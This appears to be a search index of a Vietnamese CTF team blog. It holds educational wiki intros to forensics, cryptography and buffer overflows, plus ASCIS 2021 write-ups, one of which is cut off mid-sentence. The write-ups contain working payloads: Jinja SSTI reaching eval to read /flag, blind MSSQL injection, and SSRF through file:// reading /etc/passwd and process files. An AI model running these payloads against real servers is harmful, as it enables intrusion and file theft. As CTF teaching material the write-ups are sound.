‘&amp;lt;’ này vào giữa ‘{{‘ và ‘}}’ bypass được luôn, vì nó chỉ replace có 1 lần thôi :D{% set g=&#39;__slabolg__&#39;|reverse%}{% set b=&#39;__snitliub__&#39;|reverse%}{% set p=t.__init__[g][b][&#39;eval&#39;]%}{&amp;lt;{p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}&amp;gt;}Các bạn có thể đọc exploit code của mình tại đây rồi chạy thử.Mặc dù vậy khi chạy exploit code chúng ta chỉ mới một nửa flag. Lí do nó spam các kí tự “a” ở cuối mà ko chịu in tiếp flag là vì theo exploit code thì string “index” sẽ được replace bằng một chuỗi “xxxx…” tăng dần, đồng nghĩa với độ dài payload sẽ liên tục tăng. Mà hàm isValid trong waf.py chỉ cho phép payload dưới 202 kí tự:if countChar(picture) and len(picture) &amp;lt;= 202: ...Không sao cả, bạn chỉ cần thay đổi index của flag string từ [s] (iterate từ đầu đến cuối):{% set g=&#39;__slabolg__&#39;|reverse%}{% set b=&#39;__snitliub__&#39;|reverse%}{% set p=t.__init__[g][b][&#39;eval&#39;]%}{&amp;lt;{p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}&amp;gt;}Thành [-s] (iterate từ cuối lên đầu):{% set g=&#39;__slabolg__&#39;|reverse%}{% set b=&#39;__snitliub__&#39;|reverse%}{% set p=t.__init__[g][b][&#39;eval&#39;]%}{&amp;lt;{p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[-s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}&amp;gt;}“Ez get flag” nhưng éo ez chút nào!!!! Flag cuối cùng là:ISITDTU{A_FreE_FlaG_FOr_YoU_!!!!!!!!!!!_heHe}" }, { "title": "Forensics", "url": "/posts/Forensics/", "categories": "Wiki, Forensics", "tags": "wiki, forensics", "date": "2021-11-09 20:07:00 +0700", "snippet": "Digital Forensics là gì ?Digital Forensics (hay còn gọi là điều tra số) là công việc phát hiện, bảo vệ và phân tích thông tin được lưu trữ, truyền tải hoặc được tạo ra bởi một máy tính hoặc mạng máy tính, nhằm đưa ra các suy luận hợp lý để tìm nguyên nhân, giải thích các hiện tượng trong quá trình điều tra. Khái niệm này được ra đời vào những năm 1980 do sự phát triển của máy tính cá nhân, khi xảy ra trộm cắp thiết bị phần cứng, mất mát dữ liệu, vi phạm bản quyền, virus máy tính phá hoại… Các doanh nghiệp và chính phủ các nước khi đó cũng ý thức hơn về vấn đề bảo mật.Mục tiêuMục tiêu cốt lõi của Digital Forensic là phát hiện, bảo quản, khai thác, tài liệu hóa và đưa ra kết luận về dữ liệu thu thập được. Cần lưu ý rằng dữ liệu phải đảm bảo tính xác thực, và được lấy mà không bị hư hại, nếu không dữ liệu đấy sẽ không còn ý nghĩa.Tại sao chúng ta cần Forensics ?Vấn đề được đặt ra giả sử bạn sở hữu một website hay thiết bị nào đấy, rồi đột nhiên bạn phát hiện ra thiết bị hay website của mình bị hacker tấn công và gây ra một lượng thiệt hại không nhỏ đối với bạn. Lúc này, bạn muốn xác định nguyên nhân bị tấn công, tìm cách khắc phục để sự việc không tái diễn hay thậm chí là xác định thủ phạm. Đó là lúc bạn cần đến Forensics. Đấy chỉ là một ví dụ khá điển hình, ngoài ra còn những trường hợp khác như để phát hiện mã độc trên máy tính, kiểm tra sự bất thường trong mạng, phát hiện sự xâm nhập… Nói chung Forensics giúp chúng ta xác định được nguyên nhân sự cố và đưa ra các biện pháp giải quyết tiếp theo. Nguyên tắc trao đổi của LocardEdmond Locard (1877 – 1966) được mệnh danh là Sherlock Holmes của nước Pháp. Ông là một chuyên gia điều tra pháp y, sáng lập Viện Hình sự học của trường Đại học Tổng hợp Lyon. Locard phát biểu một nguyên tắc mà sau này trở thành kim chỉ nam ngành khoa học điều tra. Ông ta cho rằng bất cứ khi nào hai người tiếp xúc với nhau, một thứ gì đó từ một người sẽ được trao đổi với người khác và ngược lại. Có thể là bụi, tế bào da, bùn đất, sợi, mạt kim loại. Những việc trao đổi này có xảy ra – vì thế chúng ta có thể bắt được nghi phạm. Với Computer Forensics, nguyên tắc này cũng hoàn toàn đúng. Khi bạn làm việc với máy tính hay một hệ thống thông tin, tất cả hành động của bạn đều bị ghi vết lại (mặc dù việc tìm ra thủ phạm trong trường hợp này khó khăn và mất nhiều thời gian hơn rất nhiều)Đặc điểm của Digital Forensics Dữ liệu cần phân tích lớn, nếu dữ liệu chỉ là text thôi thì với dung lượng vài mb chúng ta cũng có 1 lượng thông tin rất lớn rồi. Trong thực tế thì còn khổng lồ hơn. Dữ liệu thường không còn nguyên vẹn, bị thay đổi, phân mảnh, và có thể bị lỗi Bảo quản dữ liệu khó khăn, dữ liệu thu được có thể có tính toàn vẹn cao, chỉ một thay đổi nhỏ cũng có thể làm ảnh hưởng đến tất cả. Dữ liệu forensic có thể gồm nhiều loại khác nhau: file hệ thống, ứng dụng, … Vấn đề cần forensics là khá trừu tượng: mã máy, dump file, network packet… Dữ liệu dễ dàng bị giả mạo Xác định tội phạm khó khăn, có thể bạn tìm ra được dữ liệu về hacker(IP, email, profile…) nhưng để xác định được được đối tượng thật ngoài đời thì cũng không hề đơn giản. Forensics những gì ?Digital Forensic thường làm việc với những đối tượng sau: Physical Media, Media Management: Liên quan đến phần cứng, tổ chức phân vùng, phục hồi dữ liệu khi bị xóa… File System: Phân tích các file hệ thống, hệ điều hành windows, linux, android… Application: Phân tích dữ liệu từ ứng dụng như các file Log, file cấu hình, reverse ứng dụng… Network: Phân tích gói tin mạng, sự bất thường trong mạng Memory: Phân tích dữ liệu trên bộ nhớ, thường là dữ liệu lưu trên RAM được dump ra Ai làm forensic?Những người làm công việc Forensics thường phải có kinh nghiệm và kiến thức khá rộng về khoa học máy tính, mạng, bảo mật. Trong những trường hợp cần kiến thức chuyên sâu, sẽ có nhiều người cùng tham gia để giải quyết. Ở các doanh nghiệp lớn, những người làm An toàn vận hành(Security Operator) sẽ đảm nhận công việc này. Với những người làm bảo mật thì đây cũng là một công việc rất thú vị." }, { "title": "Cryptographic", "url": "/posts/Cryptographic/", "categories": "Wiki, Cryptographic", "tags": "wiki, cryptographic", "date": "2021-11-09 20:07:00 +0700", "snippet": "Tổng quanCryptography (Mật mã học) là một phân nhánh cổ xưa nhất của bảo mật. Có lẽ trong số chúng ta lại biết nhiều nhất là mật mã Caesar của quân đội La Mã cổ đại, nhưng thực chất, lịch sử của mật mã học đã phát triển từ trước đó rất lâu rồi. Cụ thể, mật mã đầu tiên được ghi nhận là hệ thống các chữ tượng hình được khắc trên một lăng mộ tại Ai Cập (khoảng năm 1900 TCN), cũng vào thời kì này của Ai Cập, có một cuốn sách mang tên Greek Magical Papyri cũng được mã hoá một phần. Tại Ấn Độ (400 TCN - 200), các cặp đôi yêu nhau sử dụng kĩ thuật Mlecchita vikalpa như một phương pháp để trao đổi thông tin mà không bị phát hiện. Skip nhanh đến thời hiện đại, một nhà toán học vĩ đại, người mà nổi tiếng không chỉ trong lĩnh vực toán học, mà còn là tiền đề của ngành mật mã học và ngành học máy, Alan Turing với chiếc máy Bombe của mình, đã thành công giải mã các mật mã được tạo ra bởi cỗ máy Enigma của Đức Quốc xã (thứ mã Hitler ca ngợi là “Mật mã số một thế giới, thần thánh cũng không giải được”), từ đó, đem lại chiến thắng cho quân Đồng Minh.Ngày nay, mật mã được ứng dụng rất nhiều trong tin học, cụ thể là trong việc trao đổi và lưu trữ dữ liệu một cách an toàn theo các tiêu chí: Confidentiality (tính bảo mật): Dữ liệu phải được đảm bảo không bị lộ, truy cập bởi những người dung không được phép. Integrity (tính toàn vẹn): Dữ liệu phải nguyên vẹn, đảm bảo không bị chỉnh sửa cho dù với bất kì nguyên nhân nào (bị tấn công, mất mát, …) Availability (tính sẵn sàng): Dữ liệu phải luôn trong trạng thái sẵn sàng và có thể truy cập bất cứ lúc nào. Non-repudiation (không thể chối bỏ): Cụ thể là khi dữ liệu được trao đổi giữa 2 bên A và B, cả 2 bên không thể phủ nhận việc đó, và cũng đồng thời chắc chắn rằng, không ai khác ngoài A và B biết điều này. Mặc dù tính sẵn sàng không được thể hiện quá nhiều trong mã hoá, nhưng trong ứng dụng thực tế, các cơ chế mã hoá điện tử lại thể hiện rất rõ 3 tính chất còn lại. Hiện nay, việc nhắc đến “Cryptography” là ám chỉ một trong các kĩ thuật sau: Symmetric encryption (Mã hoá đối xứng) Asymmetric encryption (Mã hoá bất đối xứng) Hashing (Kĩ thuật băm) Digital signatures(Chữ kí số) Có 2 thuật ngữ mà ta cần nắm rõ: Encryption: là quá trình mã hoá một thông điệp từ dạng đọc được (Plain text) thành không đọc được (Cipher text) Decryption: là quá trình ngược lại của encryption (Cipher text à Plain text ) Symmetric encryptionMã hoá đối xứng là kiểu mã hoá mà quá trình encryption và decryption sử dụng chung một mã (key). Các thuật toán mã hoá đối xứng thường được sử dụng như DES, AES, RC4, RC5,…Việc sử dụng mã hoá đối xứng sẽ hoạt động như sau: Bên gửi sinh ra Plain text $(M)$ Bên gửi sinh ra một khoá kín ($KS$ – Secret Key) một cách ngẫu nhiên và gửi cho bên nhận Bên gửi sử dụng khoá $KS$ để encrypt plain text $M$ thành một bản mật ($C$ - Cipher text), quá trình này được thể hiện như sau $C = E(KS, M)$ và gửi cho bên nhận Bên nhận sử dụng key $KS$ và Cipher text đã nhận để Decrypt về plain text $M = D(KS, C)$ Từ cơ chế trên, ta thấy rằng, việc để ổ khoá chung với chìa khoá như vậy sẽ sinh ra các vấn đề về bảo mật. Hãy thử tưởng tượng, ông tướng A gửi một thư mật cho ông tướng B, bức thư được mã hoá và bên dưới có ghi cách giải, ông A giao cho anh lính gửi hoả tốc, nhưng trên đường bị tướng địch bắn hạ và thu được mật thư :D Đây chính là phương pháp tấn công Man-in-the-middle (MITM).Asymmetric encryptionMã hoá bất đối xứng là kiểu mã hoá mà quá trình encryption và decryption sử dụng mã key khác nhau, các thuật toán mã hoá tiêu biểu: RSA, DSA, PKCS,…Quá trình mã hoá bất đối xứng như sau: Bên nhận tạo ra một khoá công khai ($KP$ – public key) và gửi cho bên gửi, đồng thời tạo khoá kín ($KS$), được bên nhận giữ kín Bên gửi sau khi tạo ra plain text ($M$), tiến hành mã hoá $M$ bằng $KP$ của bên nhận đã gửi trước đó: $C = E(M, KP)$ và gửi C cho bên nhận Bên nhận sử dụng khoá $KS$ để giải mã thông điệp đã nhận được: $C = D(M, KS)$ Trong mã hoá bất đối xứng, $KS$ và $KP$ sẽ được tạo sao cho trong trường hợp người dung bị MITM lấy mất $KP$, hackers cũng không thể suy ra được $KS$ nhưng vẫn tồn tại một mối quan hệ toán học giữa 2 key, cơ chế $KS – KP$ này giúp người dung có thể yên tâm, ngay cả khi thông điệp giữa bên A và B bị lộ, thì những quá trình trao đổi thông tin giữa A và C, D, … vẫn được đảm bảo bí mật.Có thể thấy rằng, mã hoá bất đối xứng đã giải quyết được những hạn chế của mã hoá đối xứng, khi mà chỉ có người sở hữu $KS$ mới có thể đọc được nội dung đã được mã hoá bằng $KP$. Nhưng, làm thế nào để ta biết được cái $KP$ là chính xác của bên gửi? Hãy tìm hiểu thêm về Public Key Infrastructure (PKI). Trên thực tế, chúng ta sẽ nhờ các nhà cung cấp chứng thực số (Certificate Authority - CA) đóng vai trò làm trung gian trong quá trình trao đổi thông tin.Hashing functionsNgược lại với cơ chế mã hoá/giải mã như trên, hashing functions là những hàm chỉ có 1 chiều, tức là, bạn đưa input vào hash functions và nhận được một đoạn hash, nhưng bạn không thể convert ngược đoạn hash đó về input được :DMột hàm hashing lý tưởng phải thoả mãn 2 điều kiện: Mã hash được tạo ra của input phải là độc nhất, 2 input khác nhau không được phép có mã hash giống nhau. Với input giống nhau phải cho ra mã hash giống nhau. Nếu đã từng thao tác với mã hash thì sẽ thấy chúng giống như được tạo ra ngẫu nhiên, nhưng không phải vậy, với mỗi loại mã hash (SHA256, MD5, …) thì chúng sẽ có một độ dài cố định.Từ những đặc điểm trên, hashing functions không thể được sử dụng trong việc lưu trữ dữ liệu (mã hoá xong phát coi như mất :D) nhưng lại có thể được sử dụng để xác định tính toàn vẹn của dữ liệu, vì chỉ cần thay đổi dù chỉ là một dấu cách trong input, sẽ tạo ra một mã hash khác hoàn toàn. Bên cạnh đó, khi mà việc lưu trữ trực tiếp password trong database đã quá nguy hiểm, việc lưu trữ chúng dưới dạng Hashing cũng là một lựa chọn, lưu password được tạo dưới dạng mã hash, mỗi lần người dùng đăng nhập thì hashing lại input của người dùng và đối chiếu với mã hash đã lưu, vừa đảm bảo có gì đó để so sánh, vừa đảm bảo không để lộ thông tin nhạy cảm khi sự cố xảy ra.Digital signaturesĐây là sự kết hợp giữa mã hoá bất đối xứng và hashing functions: Phía signer sẽ tiến hành hash input và mã hoá tiếp với KS Signer gửi thông điệp đính kèm với chữ kí số vừa được tạo Phía người nhận sẽ sử dụng $KP$ để decrypt chữ kí số về mã hash, sau đó tiến hành hash thông điệp đính kèm để đối chiếu với mã hash của chữ kí số Đây là cách để đảm bảo tính toàn vẹn, tính bảo mật và tính không thể chối từ của thông điệp được gửi đi. Nhờ đảm bảo được những điều trên, chữ ký số được sử dụng trong giao dịch điện tử, e-mail, chuyển tiền, thanh toán trực tiếp, … Ngoài ra, chữ ký số cũng được áp dụng trong các công vụ của Chính phủ như thuế, hải quan, …Kết luậnMật mã học (Cryptography) là một mảng đã có quãng thời gian phát triển lâu đời nhất trong bảo mật thông tin, với lịch sử phát triển lâu đời như vậy, thật không dễ để chúng ta có thể nắm được, vì vậy tôi xin được đề cập một số cuốn sách để tham khảo và rèn luyện về mảng “Old but Gold” này: Cryptography made simple – Nigel P. Smart Applied cryptography – Bruce Schneier Cryptography: Theory and Practice – Doug Stinson Understanding cryptography: A textbook for students – Christof Paar Giáo trình mật mã học và an toàn thông tin – Ts. Thái Thanh Tùng " }, { "title": "Binary Exploitation", "url": "/posts/Binary-Exploitation/", "categories": "Wiki, Binary Exploitation", "tags": "wiki, pwn, binary", "date": "2021-11-09 20:07:00 +0700", "snippet": "Tổng quanBinary Exploitation (hay còn gọi là pwn) liên quan đến việc tìm ra lỗ hổng trong chương trình và khai thác nó để giành quyền kiểm soát hoặc sửa đổi các chức năng của chương trình. Công việc này nghiên cứu về các lỗ hổng mà phổ biến có thể kể đến như: Buffer Overflow (tràn bộ đệm): Tràn bộ đệm là lỗi thông thường, dễ phòng chống, nhưng lại rất phổ biến và có hậu quả nguy hiểm nhất. Nó được xếp vào hàng danh sách các lỗi đe dọa nghiêm trọng đến sự an toàn của chương trình và hệ thống. Năm 2009, viện SANS (Escal Institute of Advanced Technologies) đã đưa ra báo cáo 25 lỗi lập trình nguy hiểm nhất trong đó có lỗi tràn bộ đệm. Integer Overflow (tràn số nguyên): Tràn số nguyên xảy ra khi một phép toán số học có kết quả nằm ngoài phạm vi có thể được biểu diễn bằng một số có số chữ số nhất định (có thể là cao hơn giá trị lớn nhất hoặc thấp hơn giá trị nhỏ nhất có thể biểu diễn của kiểu dữ liệu). Return Oriented Programming (ROP): Đây là một kỹ thuật khai thác bảo mật được các hacker khai thác để thực thi các đoạn mã (thường là nhằm mục đích xấu) trên hệ thống của nạn nhân. Format String Vulnerable (lỗ hổng định dạng chuỗi): Xảy ra khi dữ liệu được đưa vào bị chương trình xem như một lệnh để thực thi. Bằng cách này, hacker có thể thực thi các đoạn mã, đọc ngăn xếp hoặc gây ra lỗi phân đoạn trong chương trình đang chạy, gây ra các hành vi có thể ảnh hưởng đến bảo mật hoặc sự ổn định của hệ thống. Heap Exploitation là một lỗ hổng mà xảy ra khi có nhiều dữ liệu hơn số lượng có thể chứa trong bộ đệm đã được cấp phát. Nó có thể dẫn đến hỏng siêu dữ liệu heap hoặc hỏng các đối tượng heap khác, từ đó cung cấp bề mặt tấn công mới. Ví dụỞ đây, mình lấy ví dụ về lỗi tràn bộ đệm, còn các lỗ hổng khác các bạn có thể tìm hiểu trên mạng để được các chuyên gia mô tả cho dễ hình dung. Quay lại buffer overflow thì như đề cập ở trên thì đây là một lỗi rất dễ phòng tránh tuy nhiên nó vẫn có thể xảy ra và dẫn đến các hậu quả hết sức nguy hiểm. Nguy hiểm thế nào thì ta sẽ bắt đầu đi vào ví dụ sau:Trường Đại học U đang triển khai đăng ký thông tin nhập học cho tân sinh viên. Sau khi nhập các thông tin cần thiết vào chương trình trên, sinh viên A nhận được một giao diện có thiết kế như sau: Họ và tên Số điện thoại Điểm xét tuyển Nguyễn Văn A 0908222227 7.3 Trong đó, mục [Họ và tên] và [Điểm xét tuyển] là Chỉ-có-thể-đọc (được bôi đậm) , còn ở [số điện thoại], sinh viên được phép sửa đổi. Yêu cầu của số điện thoại là tối đa 10 chữ số. Nhận thấy số điện thoại của mình bị sai, A thực hiện thao tác sửa đổi và cập nhật mới. Trong quá trình sửa đổi, A vô tình bấm “nhầm” thêm một số dẫn đến đầu vào là một dãy 11 chữ số như sau 09082222229. Sau khi ấn submit, kết quả mà A nhận được là Họ và tên Số điện thoại Điểm xét tuyển Nguyễn Văn A 0908222222 9.7 Đến đây thì mình tin chắc các bạn cũng đã hiểu ra vấn đề. Ở đây chữ số 9 ở số điện thoại đã bị thay thế vào vị trí của số 7 trong mục [Điểm xét tuyển] hay nói các khác là chữ số thừa này của [Số điện thoại] đã bị tràn sang bộ nhớ bên cạnh nó.Với số điểm xét tuyển gần như tuyệt đối này thì không có cớ gì A sẽ được trao học bổng trong 4 năm học ngay và luôn. Tuy nhiên, do A là một học sinh trung thực, 12 năm liền học sinh Giỏi và là cháu ngoan Bác Hồ nên A đã chủ động liên hệ với nhà trường để báo cáo lỗi. Nhờ việc xử lý và giải quyết một cách nhanh nhẹn, A đã được nhà trường tuyên dương cũng như trao thưởng. Phần thưởng tuy nhỏ nhưng A được cả trường biết đến và được nhận nhiều lời tán dương. A rất tự hào và tự hứa sẽ học tập thêm kỹ năng ATTT để tiếp tục phát hiện và báo cáo nhiều lỗi như thế nữa. Chính vì vậy, A đã đăng ký tham gia vào CLB FPTU - Ethical Hacker Club, một câu lạc bộ về ATTT mà đúng với tiêu chí của A là BDSM (Bay bổng - Đảm đang - Sáng tạo - Muôn màu)Tuy nhiên đây chỉ là một câu chuyện hoang tưởng để lấy ví dụ về Binary Exploitation, các bạn không nên làm tại nhà vì rất dễ được “học bổng” của nhà nước (được ở nhà của nhà nước, được ăn cơm nhà nước, mặc quần áo nhà nước). Trên thực tế thì buffer overflow cũng tương tự như vậy. Các lỗ hổng liên quan đến việc tràn bộ đệm thường xảy ra do lập trình viên bỏ qua các chú ý đến nguy cơ bị ghi đè dữ liệu lên các vùng nhớ kế cận. Ở phần kết luận, mình sẽ đưa ra giải pháp cho các lập trình viên newbie cách phòng tránh vấn đề này.Kết luậnVề tác hại: các lỗi liên quan đến Binary Exploitation làm cho chương trình dừng hoạt động, gây mất dữ liệu hoặc khiến cho kẻ xấu lợi dụng để tấn công, kiểm soát hệ thống nhằm mục đích trục lợi.Để phòng tránh lỗi tràn bộ đệm ở các chương trình C, các lập trình viên nên đọc kỹ về hàm gets, nó thường được cảnh báo nguy hiểm trong khi biên dịch chương trình. Giả sử có biến var, kết quả của printf (var) sẽ là bao nhiêu nếu var là %p. Hãy thử viết một chương trình C như vậy và tự xem kết quả. Bật mí thì đây là ví dụ của lỗi định dạng chuỗi.Có một số trang để rèn luyện kỹ năng về Binary Exploitation có thể kể đến như pwnable.tw, đây là trang web hoàn toàn miễn phí. Các thử thách trên đây luôn được cập nhật để bổ sung kỹ năng cho bạn. Ngoài ra có một số trang khác như HackTheBox cũng là một nơi để các bạn bắt đầu nghiên cứu về mảng bảo mật này." }, { "title": "ASCIS (ASEAN Student Contest on Information Security) &#39;s Web Write-ups", "url": "/posts/SVATTT-Web/", "categories": "CTF, Web Challenges", "tags": "writeups, web, SVATTT2021", "date": "2021-10-17 12:00:00 +0700", "snippet": " Ở SVATTT 2021 năm nay thì team mình không vượt qua vòng lại, tuy nhiên cá nhân mình vẫn solve đc 2 bài web Script Kiddie và OProxy, coi như là một kỉ niệm lần đầu đi thi SVATTT có vui lẫn buồn.Script KiddieSource1. Initial reconaissance:Như mô tả ta có thể biết rằng web có chứa lỗ hổng SQL-injection với cơ sở dữ liệu được dùng ở đây là Microsoft SQL Server. Câu query như hình dưới2. Exploit and get the flag: Payload:(CASE WHEN (ascii(substring(db_name(), 1, 1)) =115) THEN 99 ELSE 1*&#39;name&#39; end) Bạn có thể dùng Intruder của Burp Suite để brute force, hoặc tự viết script, các response trả về status 200 OK đồng nghĩa với payload trả về 99 –&amp;gt; true –&amp;gt; kí tự valid thuộc database name (lấy từ hàm db_name của payload). Tham khảo bài viết sau về các dùng Intruder của Burp Suite: https://portswigger.net/burp/documentation/desktop/tools/intruder/using. Flag: ASICS{ssalchtiwesmihcueymorf}OProxy1. Initial reconnaissance:Đầu tiên chúng ta cần tạo account để login vào:Sau khi xem qua sơ bộ thì ta có thể tóm tắt web app của challenge này có những chức năng như sau: /proxy: khi nhập vào một URL bất kì (vd như https://stackoverflow.com) rồi bấm nút “Go!” thì web app sẽ tự động redirect đến URL đó. /history?key=&amp;lt;key&amp;gt;&amp;amp;memcache=&amp;lt;memcache&amp;gt;: tất cả những URL mà web app này redirect đến thông qua chức năng /proxy sẽ được ghi lại tại đây. Parameter key có lẽ là để xác định mỗi trang history riêng biệt cho từng user, còn memcache thì không rõ là để làm gì, nhưng khi gán memcache 1 giá trị bất kì thì ô thuộc cột Cached trong bảng history thay đổi.2. Find the vulnerabilities: Như đã nói về parameter key thuộc chức năng /history, chúng ta sẽ tạo thêm một account nữa, sau đó thử lấy key của user hoangnch thay cho key của user đó để check xem web app này có bị IDOR không.Hmm, như vậy không bị dính IDOR. Có lẽ chức năng history không phải là mấu chốt để giải được bài này. Chúng ta lại test tiếp chức năng /proxy. Sẽ ra sao nếu chúng ta không nhập vào đấy một URL bình thường như https://github.com mà là một cái link của Burp Collaborator client nhỉ?Web app này vẫn gửi request tới Collaborator client của chúng ta mà không hề validate URL. Điều này chứng tỏ nó đã bị dính Server Side Forgery Request.Oke, vậy sẽ ra sao nếu URL là http://127.0.0.1/register (127.0.0.1 đồng nghĩa với localhost, là chính nó luôn) nhỉ?OMG, cũng được luôn. Tuy nhiên, vì chúng ta sủ dụng URL có protocol là HTTP, do đó chắc chắn chỉ có thể nhìn nhận web app này dưới dạng HyperText. Thử sửa http thành file xem sao, cụ thể là file://127.0.0.1/etc/passwd:Tuyệt vời, điều này có nghĩa là chúng ta có thể path traversal thông qua FILE protocol, sau đó thoải mái đọc file trên localhost của web app này!3. Exploit and get flag:Còn một trở ngại cuối cùng nữa, đó là chúng ta không biết flag này ở chỗ nào :v. Nếu bài này mà lại đi đoán đường dẫn thì unintended vl :(. Sau một hồi brute force tìm đường dẫn đến tuyệt vọng thì chợt nhận ra là Linux lưu trạng thái của tất cả mọi thứ dưới dạng file (đọc tại đây), kể cả các process đang chạy trên máy. /proc/self là một trong những magic đó của Linux, nó là folder chứa context của process hiện tại. Trong /proc/self đó lại chứa rất nhiều file và folder lưu nhiều thông tin khác nhau của process hiện tại, trong đó cái thú vị nhất là /proc/self/cwd chứa directory hiện tại mà process đang chạy trên đó (current working directory):Để dễ hiểu hơn thì ta sẽ thử chạy một cái app php tại đường dẫn /home/kali/Documents/php_basic trên linux rồi check xem bên trong /proc/self/cwd có gì:Vậy chắc chắn flag sẽ nằm trong current working directory của process đang chạy cái web app này. Do đó, payload của cuối cùng sẽ là: file://127.0.0.1/proc/self/cwd/flag.txtFlag: ASCIS{SSRF_M3mcached_inj3cti0n}" }, { "title": "ASCIS (ASEAN Student Contest on Information Security) &#39;s Cryptography Write-ups", "url": "/posts/SVATTT-Crypto/", "categories": "CTF, Cryptographic Challenges", "tags": "writeups, cryptographic, SVATTT2021", "date": "2021-10-16 22:00:00 +0700", "snippet": "EasyOne A challenge about digital certificate problem, just the basic things. Full source code can found at here.1. Challenge analysisRead the source code, I figured out that there is a route /flag which will tell us the flag of this challenge, but only admin can access content of flag:@app.route(&quot;/flag&quot;)@login_requireddef flag(): flag = &quot;You are not admin&quot; if session[&quot;role&quot;] == ROLE_ADMIN: flag = &quot;ASCIS{xxxxxx}&quot; return render_template(&#39;flag.html&#39;, flag=flag)There is a register function, but we can’t register as admin. It just allow us to register as a normal user:@app.route(&quot;/register&quot;, methods=(&#39;GET&#39;, &#39;POST&#39;))def register(): if request.method == &#39;POST&#39;: username = request.form[&#39;username&#39;] password = request.form[&#39;password&#39;] email = request.form[&#39;email&#39;] role = ROLE_USER if not username or not password: flash(&#39;Username and Password is required!&#39;) else: do_register(username, password, email, role) return redirect(url_for(&#39;login&#39;)) return render_template(&#39;register.html&#39;)However, examine carefully the source code, I found that there is another way to login without admin account. It’s the /logincert route:# This function only for admin@app.route(&quot;/logincert&quot;, methods=(&#39;GET&#39;, &#39;POST&#39;))def logincert(): if request.method == &#39;POST&#39;: username = None uploaded_file = request.files[&#39;file&#39;] if uploaded_file.filename != &#39;&#39;: split_tup = os.path.splitext(uploaded_file.filename) if split_tup[1] != &quot;.pem&quot;: flash(&#39;Cert file is invalid&#39;) return render_template(&#39;logincert.html&#39;) else: username = validate_certificate(uploaded_file) if username is None: flash(&#39;Login cert is invalid!&#39;) return render_template(&#39;logincert.html&#39;) else: session[&quot;username&quot;] = username session[&quot;role&quot;] = ROLE_ADMIN return redirect(url_for(&#39;index&#39;)) return render_template(&#39;logincert.html&#39;)Notice the line code username = validate_certificate(uploaded_file). Follow the code, it leads us to verify_certificate_chain(cert_pem, trusted_certs) function in file certutils.py. def verify_certificate_chain(cert_pem, trusted_certs): certificate = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem) # parse ceritificate information clientcert = CertInfo(certificate) # get subject common name subject = clientcert.subject_cn issuer = clientcert.issuer_cn # Check if subject is admin user if subject != &quot;admin&quot;: raise Exception(&quot;Not trusted user&quot;) # validate issuer if issuer != &quot;ca&quot;: raise Exception(&quot;Not trusted ca&quot;) thumbprint = clientcert.digest_sha256.decode(&#39;utf-8&#39;) #TODO: validate thumbprint #Create a certificate store and add your trusted certs try: store = crypto.X509Store() # Assuming the certificates are in PEM format in a trusted_certs list for _cert in trusted_certs: cert_file = open(_cert, &#39;r&#39;) cert_data = cert_file.read() client_certificate = crypto.load_certificate(crypto.FILETYPE_PEM, cert_data) store.add_cert(client_certificate) # Create a certificate context using the store store_ctx = crypto.X509StoreContext(store, certificate) # Verify the certificate signature, returns None if it can validate the certificate store_ctx.verify_certificate() # verify success return subject except Exception as e: print(&quot;[+] Debug certificate validation failed&quot;) return FalseFor the one that does not really understand the detail code of digital certificate as me, I have been overwhelmed and confused a little bit. However, just pay attention to the output and the requirement in 2 if statements, I can draw out the 2 following conclusions: There are 2 requirements to successfully login by certificate: the subject must be admin and the issuers must be ca. It’s really easy~~ After passing these 2 requirements, it return us subject, which is actually the admin. Now we will a admin session, thus get the flag.So, let’s go on to create a digital ceritificate.2. Create digital certificateI use openssl on Kali Linux machine to create digital certiifcate. The ideas is simple: Create a certificate owned by ca \\rightarrow→ subject = ca and issuer = ca. Create another certificate owned by admin \\rightarrow→ subject = admin and issuer = admin. Sign the second certificate by the first certificate \\rightarrow→ subject = admin and issuer = ca.For the technical details, follow step by step as following: Create a RSA key pair for ca certificate:thangpdhe141354@kali:~$ openssl genrsa -out ca.key 2048Generating RSA private key, 2048 bit long modulus (2 primes).............+++++...........................+++++e is 65537 (0x010001) Create a certificate owned by ca. Left all other blanks and fill Common Name as ca:thangpd3160@kali:~$ openssl req -new -x509 -days 1826 -key ca.key -out ca.crtYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter &#39;.&#39;, the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:caEmail Address []:After create, you can see the CA look like this: Create a RSA key pair for admin certificate:thangpd3160@kali:~$openssl genrsa -out ia.key 2048Generating RSA private key, 2048 bit long modulus (2 primes).....+++++.............+++++e is 65537 (0x010001) Create a certificate owned by admin. Left all other blanks and fill Common Name as admin:thangpd3160@kali:~$ openssl req -new -key ia.key -out ia.csrYou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter &#39;.&#39;, the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:adminEmail Address []:Please enter the following &#39;extra&#39; attributesto be sent with your certificate requestA challenge password []:An optional company name []:The created certificate will look as following: Sign the second certificate by the first certificate:thangpd3160@kali:~$ openssl x509 -req -days 730 -in ia.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out ia.crtSignature oksubject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = adminGetting CA Private KeyThe signed certificate will look as following: Finally, convert the certificate to .pem format to fit the code requirement:thangpd3160@kali:~$ openssl x509 -in ia.crt -out ia.pem -outform PEM3. Submit the digital certificate and get the flagSubmit file ia.pem to server:Logon!And get the flag!ConfuseOne This is blackbox crypto challenge! There is no source, and actually the most practical one.1. Challenge analysis:First at all, just register and login. Browse the web and I see the profile page has a suspected line, which is “You are not admin”:The flag may in this page, but we need to login 